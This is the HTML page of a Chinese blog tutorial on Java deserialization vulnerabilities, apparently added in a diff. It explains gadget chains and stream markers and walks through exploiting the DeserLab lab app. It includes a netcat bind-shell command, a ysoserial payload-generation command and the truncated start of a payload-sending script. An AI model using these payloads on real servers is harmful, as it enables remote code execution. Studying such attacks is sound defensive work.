@@ -1,0 +1,289 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>Java反序列化 | 知识茧房</title><meta name="keywords" content="java反序列化"><meta name="author" content="sh@rp"><meta name="copyright" content="sh@rp"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="为什么会有序列化在面向对象的世界中，所有对象的状态信息是不断变化的，为了在不同平台之间更方便的传输和利用这些数据，可以使用序列化将对象格式化然后存储在本地文件系统或者写入网络传输流中，在需要使用该数据时再从磁盘中或网络传输流中取出该数据进行反序列化。 通常进行反序列化需要以下两个条件：  该类必须实现了java.io.Serializable或java.io.Externalizable接口。前者">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java反序列化">
+<meta property="og:url" content="https://sharpa.cn/2022/03/16/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
+<meta property="og:site_name" content="知识茧房">
+<meta property="og:description" content="为什么会有序列化在面向对象的世界中，所有对象的状态信息是不断变化的，为了在不同平台之间更方便的传输和利用这些数据，可以使用序列化将对象格式化然后存储在本地文件系统或者写入网络传输流中，在需要使用该数据时再从磁盘中或网络传输流中取出该数据进行反序列化。 通常进行反序列化需要以下两个条件：  该类必须实现了java.io.Serializable或java.io.Externalizable接口。前者">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://sm.ms/image/VZdNvELIAxOUY3o">
+<meta property="article:published_time" content="2022-03-16T10:07:38.000Z">
+<meta property="article:modified_time" content="2022-03-19T08:21:47.921Z">
+<meta property="article:author" content="sh@rp">
+<meta property="article:tag" content="java反序列化">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://sm.ms/image/VZdNvELIAxOUY3o"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://sharpa.cn/2022/03/16/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?226e8a286317f52a48c8d9e6788c5bfd";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Java反序列化',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-03-19 16:21:47'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s2.loli.net/2022/01/23/fGp3IMyUswHugoY.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">15</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">33</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">22</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li><li><a class="site-page child" href="/books/"><i class="fa-fw fas fa-book"></i><span> 阅读</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 介绍</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://sm.ms/image/VZdNvELIAxOUY3o')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">知识茧房</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li><li><a class="site-page child" href="/books/"><i class="fa-fw fas fa-book"></i><span> 阅读</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 介绍</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Java反序列化</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-03-16T10:07:38.000Z" title="发表于 2022-03-16 18:07:38">2022-03-16</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-03-19T08:21:47.921Z" title="更新于 2022-03-19 16:21:47">2022-03-19</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86/">基础原理</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">3.7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>13分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Java反序列化"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2022/03/16/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/2022/03/16/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" itemprop="commentCount"></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="为什么会有序列化"><a href="#为什么会有序列化" class="headerlink" title="为什么会有序列化"></a>为什么会有序列化</h1><p>在面向对象的世界中，所有对象的状态信息是不断变化的，为了在不同平台之间更方便的传输和利用这些数据，可以使用序列化将对象格式化然后存储在本地文件系统或者写入网络传输流中，在需要使用该数据时再从磁盘中或网络传输流中取出该数据进行反序列化。</p>
+<p>通常进行反序列化需要以下两个条件：</p>
+<ol>
+<li>该类必须实现了<code>java.io.Serializable</code>或<code>java.io.Externalizable</code>接口。前者完全由自身来控制反序列化的行为，后者可以采用默认的序列化方式。</li>
+<li>该类的所有属性必须是可序列化的，如果有一个属性是不可序列化的，那么必须标明是短暂的。</li>
+</ol>
+<h2 id="相关的类和方法"><a href="#相关的类和方法" class="headerlink" title="相关的类和方法"></a>相关的类和方法</h2><p>在该篇文章中使用Java内置的序列化格式。<br>相关类：<code>java.io.ObjectInputStream</code>与<code>java.io.ObjectOutputStream</code><br>序列化：<code>java.io.ObjectOutputStream</code>类—&gt;&gt;&gt;<code>writeObject()</code><br>该方法将参数指定的obj对象序列化，然后将字节序列写到一个目标输出流(文件或者socket)中，Java标准后缀为<code>.ser</code>的文件<br>反序列化:<code>java.io.ObjectOutputStream</code>类—&gt;&gt;&gt;<code>readObject()</code><br>该方法正好与序列化过程相反。是从一个输入流中读取字节序列，然后将它反序列化为一个对象后返回。<br>需要说明的一点是，序列化之后的格式是多样的，可以是基于文本的，比如JSON或者XML，也可以是二进制格式。<br>Java中有关序列化的函数有：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readUnshared</span><br><span class="line">XMLDecoder.readObject</span><br><span class="line">Yaml.load</span><br><span class="line">XStream.fromXML</span><br><span class="line">ObjectMapper.readValue</span><br><span class="line">JSON.parseObject</span><br></pre></td></tr></table></figure>
+<h1 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h1><p>产生原因：对于类中的对象属性用户可控，在进行序列化的类中重写了<code>readObject</code>方法，并且重写后的方法存在安全隐患。<br>对于方法重写原理是这样的，如果一个反序列化的类没有重写<code>readObject()</code>方法则执行默认的方法，否则执行重写之后的方法。代码体现可以在ObjectInputStream类的<code>readSerialData</code>方法里面找到，会调用<code>slotDesc.hasReadObjectMethod()</code>来看是否重写了该方法。</p>
+<p>要利用反序列化漏洞，需要注意以下两个关键点：</p>
+<ol>
+<li>可以向目标发送我们自己构造的，用来进行反序列化的序列化对象的输入点</li>
+<li>在反序列化过程中可以操控的代码片段</li>
+</ol>
+<h2 id="基础库中的反序列化漏洞"><a href="#基础库中的反序列化漏洞" class="headerlink" title="基础库中的反序列化漏洞"></a>基础库中的反序列化漏洞</h2><p><code>Apache Commons Collections</code>类库中包含许多可以用来进行反序列化的类，常见的有以下几种：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">commons-fileupload 1.3.1</span><br><span class="line">commons-io 2.4</span><br><span class="line">commons-collections 3.1</span><br><span class="line">commons-logging 1.2</span><br><span class="line">commons-beanutils 1.9.2</span><br><span class="line">org.slf4j:slf4j-api 1.7.21</span><br><span class="line">com.mchange:mchange-commons-java 0.2.11</span><br><span class="line">org.apache.commons:commons-collections 4.0</span><br><span class="line">com.mchange:c3p0 0.9.5.2</span><br><span class="line">org.beanshell:bsh 2.0b5</span><br><span class="line">org.codehaus.groovy:groovy 2.3.9</span><br><span class="line">org.springframework:spring-aop 4.1.4.RELEASE</span><br></pre></td></tr></table></figure>
+<p>POP(Property-Oriented Programing)翻译过来为面向属性的编程，利用这个来从现有的运行环境中寻找一系列可控的代码片段，然后根据需要来构成一组连续的调用链，这个调用链就叫做POP Gadgets。<br>POP Gadgets特殊的一点是，它利用的是服务器中已经存在的类属性，而不是直接向服务器发送一个类或者代码。这也就造成了该漏洞最难的地方是根据类属性来找出我们可以利用的代码。<br>如果我们能得到源代码的话，那么我们可以查看<code>readObject</code>方法和<code>ObjectInputStream.readObject</code>调用之后的代码，来看看有没有可利用的链。<br>当然，一般情况下我们是不会接触到源代码的，这时我们就可以用到上面描述的基础库来构造POP Gadgets。这种方法，需要知道应用使用了哪些第三方库，然后使用<code>ysoserial</code>生成对应的payload。<br>对于生成的payload，服务器可能返回以下几种结果：</p>
+<ul>
+<li><code>ClassNotFoundException</code>：目标不存在该链所使用的库</li>
+<li><code>java.io.IOException</code>加上<code>Cannot run program</code>信息证明该链成功了，但是目标操作系统上面不可以执行payload指定的命令</li>
+</ul>
+<p>基本库的反序列化链生成机制可以通过调试<a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial/">ysoserial</a>源码来学习。</p>
+<p>ysoserial的payload产生的结果不会返回，并且由于使用了<code>java.lang.Runtime.exec(String)</code>方法存在以下几种限制：</p>
+<ul>
+<li>不支持shell操作符，比如输出重定向<code>&gt;</code>和管道<code>|</code></li>
+<li>payload命令的参数中不可以包括空格<ul>
+<li>:heavy_check_mark: nc -lp 31313 -e /bin/sh</li>
+<li>:x: perl -e ‘use Socket;…’</li>
+</ul>
+</li>
+</ul>
+<p>这时可以使用网上的工具来消除这些限制，<a target="_blank" rel="noopener" href="https://ares-x.com/tools/runtime-exec/">Runtime-exec payload生成</a>。</p>
+<h2 id="漏洞的发现"><a href="#漏洞的发现" class="headerlink" title="漏洞的发现"></a>漏洞的发现</h2><p>知道了反序列化漏洞的原理后，怎么可以分辨是否存在反序列化漏洞呢？</p>
+<p>一种是知道程序的代码，这时我们可以使用白盒审计，搜索用来进行反序列化的函数，确定反序列化输入点，然后再看应用是否使用了上述提到的危险类库，如果存在之后使用ysoserial进行攻击。</p>
+<p>另一种是不知道程序源代码的情况下，也就是黑盒审计，这也是最常见的情况。那么这时我们可以通过抓包查看十六进制数据，来分辨程序是否进行了反序列化，以及是否使用了危险的类库。<br>序列化数据一般以<code>AC ED</code>开始，后面跟上两个字节的版本号，一般为<code>00 05</code>但也可能更高。跟在这4个字节后的是一个或多个<em>内容元素</em>，每个元素的第一个字节取值应该在<code>0x70</code>和<code>07E</code>之间，用来描述元素的类型。<br><code>AC ED 00 05</code>这四个字节只在序列化流的最开始出现一次，所以防范反序列化漏洞时只检测这四个字节是不可行的。如果一个服务器保持一个长连接，那么我们就可以在这四个字节发送完成后，再发送我们的payload。<br>当然这四个字节并不是唯一的特征，我们可以在ASCII格式的数据包中查找Java的类名。<br>在有些情况下，序列化后数据中的Java类名称可能以<em>L</em>开头的替代格式出现，以*;*结尾，并使用正斜杠来分隔命名空间和类名。<br>除了Java类名还有一些其他常见的字符串，比如：表示对象的<code>TC_OBJECT</code>，后跟其类描述<code>TC_CLASSDESC</code>的<code>sr</code>或者表示没有超类<code>TC_NULL</code>的类注解(Annotation)<code>TC_ENDBLOCKDATA</code>结尾的<code>xp</code>。<br>识别出该数据是序列化后的数据，就要定位数据部分的偏移，也就是我们注入payload的部分。</p>
+<p><code>readObject</code>方法会从序列化流中读取以下类型的内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0x70 - TC_NULL</span><br><span class="line">0x71 - TC_REFERENCE</span><br><span class="line">0x72 - TC_CLASSDESC</span><br><span class="line">0x73 - TC_OBJECT</span><br><span class="line">0x74 - TC_STRING</span><br><span class="line">0x75 - TC_ARRAY</span><br><span class="line">0x76 - TC_CLASS</span><br><span class="line">0x7B - TC_EXCEPTION</span><br><span class="line">0x7C - TC_LONGSTRING</span><br><span class="line">0x7D - TC_PROXYCLASSDESC</span><br><span class="line">0x7E - TC_ENUM</span><br></pre></td></tr></table></figure>
+<p><code>AC ED 00 05</code>后面可能跟如上的数据类型，也可能跟<code>77</code> <code>TC_BLOCKDATA</code> 或<code>7A</code> <code>TC_BLOCKDATALONG</code>类型的块元素。<br>当然序列化后的数据是将对象信息按照一定的规则组合成的，我们可以根据这个规则逆向的推出数据中的数据类型等信息。<a target="_blank" rel="noopener" href="https://github.com/NickstaDB/SerializationDumper">SerializationDumper</a>工具可以帮我们完成这个过程。<br>该数据结构的更多信息可以参考<a target="_blank" rel="noopener" href="https://docs.oracle.com/javase/7/docs/platform/serialization/spec/protocol.html">Oracle 官方文档</a><br>Java序列化格式不止上面一种，还有JSON、XML、YAML等，可以参考这个<a target="_blank" rel="noopener" href="https://codegym.cc/groups/posts/217-java-serialization-formats">链接</a></p>
+<h2 id="漏洞的利用"><a href="#漏洞的利用" class="headerlink" title="漏洞的利用"></a>漏洞的利用</h2><p>在最简单的情况下，一个对象是最先从序列化流中被读取的内容，这样我们就可以直接在开头四字节的序列化头部后面插入我们的payload。<br>上面这种情况我们可以通过查看数据包开头五个字节来辨识。如果这五个字节是四个字节的序列化头部<code>0xACED0005</code>跟随着一个字节上面所提到类型的值，那么我们就可以直接构造一个四字节的序列化头部，并在之后插入我们的payload。</p>
+<p>在其他情况下，可能有以下两种可能：</p>
+<ul>
+<li>头部后面跟着<code>TC_BLOCKDATA</code>(0x77)和一个字节的长度字段。该长度标识着后面块数据的字节数。</li>
+<li>头部后面跟着<code>TC_BLOCKDATALONG</code>(0x7A)，后面跟着四字节的长度字段。<br>这种情况下，如果块数据后面跟随着<code>readObject</code>支持的元素类型，那么我们就可以在块数据后面直接插入我们的payload，替换之前的元素类型字节。</li>
+</ul>
+<p>在序列化流中的对象在它们加载进来时就会被实例化，而不是当整个序列化流全被解析后。这个机制使我们在插入payload的同时，不用担心剩下序列化流的结构。</p>
+<h1 id="实战演示"><a href="#实战演示" class="headerlink" title="实战演示"></a>实战演示</h1><p>为了更好的介绍反序列化漏洞，接下来通过对<a target="_blank" rel="noopener" href="https://www.baidu.com/link?url=hPIzQqpMPKd5ylMoQNakGuuzsg2r70j69Bpzb8XFH2Qq6casLp-2GiSJJNl7FYMh&wd=&eqid=ecd04eb1000d3a3d00000003623591f0">DeserLab</a>的攻击，结合其源代码来一步一步的分析反序列化漏洞。<br><code>tcpdump</code> -w将原始的数据包输出到指定文件，host指定接收或发出的主机。</p>
+<h2 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h2><p>shell中键入<code>java -jar DeserLab.jar -server 0.0.0.0 9000</code>在本地9000端口开启服务。<br>服务器首先发送hello包来与客户端建立连接，发送<code>PROTOCOL_HELLO</code>给客户端，然后判断客户端返回的hello数据以及客户端版本是否匹配。之后服务器接收客户端的名字输入以及要生成hash的字符串，最后将hash加密后的字符串返回给客户端。</p>
+<h2 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h2><p>客户端同样首先也要与服务器发送hello互动，验证成功后便可以发送数据。</p>
+<h2 id="黑盒测试"><a href="#黑盒测试" class="headerlink" title="黑盒测试"></a>黑盒测试</h2><p>首先我们在不看源代码的情况下来进行分析。<br>客户端与服务器连接发送数据，在这个过程中我们抓包来看看发送的TCP数据包。<br>由于TCP数据包是分段传输的，为了得到完整的数据流，可以对TCP流进行跟踪。<br>在整个过程中，服务器发送了如下的数据，用十六进制表示：</p>
+<figure class="highlight h"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span>  ac ed <span class="number">00</span> <span class="number">05</span>                                        ....</span><br><span class="line"><span class="number">00000004</span>  <span class="number">77</span> <span class="number">04</span> f0 <span class="number">00</span> ba aa                                  w.....</span><br><span class="line"><span class="number">0000000</span>A  <span class="number">77</span> <span class="number">02</span>                                              w.</span><br><span class="line"><span class="number">0000000</span>C  <span class="number">01</span> <span class="number">01</span>                                              ..</span><br><span class="line"><span class="number">0000000</span>E  <span class="number">73</span> <span class="number">72</span> <span class="number">00</span> <span class="number">14</span> <span class="number">6</span>e <span class="number">62</span> <span class="number">2</span>e <span class="number">64</span>  <span class="number">65</span> <span class="number">73</span> <span class="number">65</span> <span class="number">72</span> <span class="number">2</span>e <span class="number">48</span> <span class="number">61</span> <span class="number">73</span>   sr..nb.d eser.Has</span><br><span class="line"><span class="number">0000001</span>E  <span class="number">68</span> <span class="number">52</span> <span class="number">65</span> <span class="number">71</span> <span class="number">75</span> <span class="number">65</span> <span class="number">73</span> <span class="number">74</span>  e5 <span class="number">2</span>c e9 a9 <span class="number">2</span>a c1 f9 <span class="number">91</span>   hRequest .,..*...</span><br><span class="line"><span class="number">0000002</span>E  <span class="number">02</span> <span class="number">00</span> <span class="number">02</span> <span class="number">4</span>c <span class="number">00</span> <span class="number">0</span>a <span class="number">64</span> <span class="number">61</span>  <span class="number">74</span> <span class="number">61</span> <span class="number">54</span> <span class="number">6f</span> <span class="number">48</span> <span class="number">61</span> <span class="number">73</span> <span class="number">68</span>   ...L..da taToHash</span><br><span class="line"><span class="number">0000003</span>E  <span class="number">74</span> <span class="number">00</span> <span class="number">12</span> <span class="number">4</span>c <span class="number">6</span>a <span class="number">61</span> <span class="number">76</span> <span class="number">61</span>  <span class="number">2f</span> <span class="number">6</span>c <span class="number">61</span> <span class="number">6</span>e <span class="number">67</span> <span class="number">2f</span> <span class="number">53</span> <span class="number">74</span>   t..Ljava /lang/St</span><br><span class="line"><span class="number">0000004</span>E  <span class="number">72</span> <span class="number">69</span> <span class="number">6</span>e <span class="number">67</span> <span class="number">3b</span> <span class="number">4</span>c <span class="number">00</span> <span class="number">07</span>  <span class="number">74</span> <span class="number">68</span> <span class="number">65</span> <span class="number">48</span> <span class="number">61</span> <span class="number">73</span> <span class="number">68</span> <span class="number">71</span>   ring;L.. theHashq</span><br><span class="line"><span class="number">0000005</span>E  <span class="number">00</span> <span class="number">7</span>e <span class="number">00</span> <span class="number">01</span>                                        .~..</span><br><span class="line"><span class="number">00000062</span>  <span class="number">78</span> <span class="number">70</span> <span class="number">74</span> <span class="number">00</span> <span class="number">09</span> <span class="number">64</span> <span class="number">61</span> <span class="number">77</span>  <span class="number">64</span> <span class="number">77</span> <span class="number">61</span> <span class="number">64</span> <span class="number">77</span> <span class="number">61</span> <span class="number">74</span> <span class="number">00</span>   xpt..daw dwadw t.</span><br><span class="line"><span class="number">00000072</span>  <span class="number">20</span> <span class="number">66</span> <span class="number">36</span> <span class="number">37</span> <span class="number">65</span> <span class="number">31</span> <span class="number">33</span> <span class="number">37</span>  <span class="number">64</span> <span class="number">66</span> <span class="number">31</span> <span class="number">33</span> <span class="number">64</span> <span class="number">65</span> <span class="number">36</span> <span class="number">36</span>    f67e137 df13de66</span><br><span class="line"><span class="number">00000082</span>  <span class="number">36</span> <span class="number">62</span> <span class="number">39</span> <span class="number">34</span> <span class="number">31</span> <span class="number">32</span> <span class="number">65</span> <span class="number">30</span>  <span class="number">33</span> <span class="number">34</span> <span class="number">66</span> <span class="number">39</span> <span class="number">38</span> <span class="number">35</span> <span class="number">63</span> <span class="number">39</span>   <span class="number">6b</span>9412e0 <span class="number">34f</span>985c9</span><br><span class="line"><span class="number">00000092</span>  <span class="number">30</span>                                                 <span class="number">0</span></span><br></pre></td></tr></table></figure>
+<p>可以看到服务器发送的数据是以<code>ac ed 00 05</code>开头的，这也正是上面我们介绍的，代表序列化数据的开头。<code>77</code>则代表后面跟的是块数据，<code>xp</code>代表块数据的结束。<code>74</code>代表数据类型是String，<code>dawdwadw</code>正是输入的数据，而<code>f</code>开头的字符串是其hash值。<br>好了当我们知道了注入点之后就可以构造payload，使用ysoserial工具。同时由于服务器使用了groovy类库，那么我们就可以利用这个类库产生POP链。<br><code>java -jar ysoserial-master-8eb5cbfbf6-1.jar Groovy1 &quot;mkdir h0cked_8y_sh@rp&quot; &gt; attack.ser</code>将产生的链保存到<code>attack.ser</code><br>由于服务器发送的序列化数据含有特殊的字节，并且客户端也必须发送包含特殊字节的数据包，所以不能简单的直接发送数据，可以参考如下payload：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span 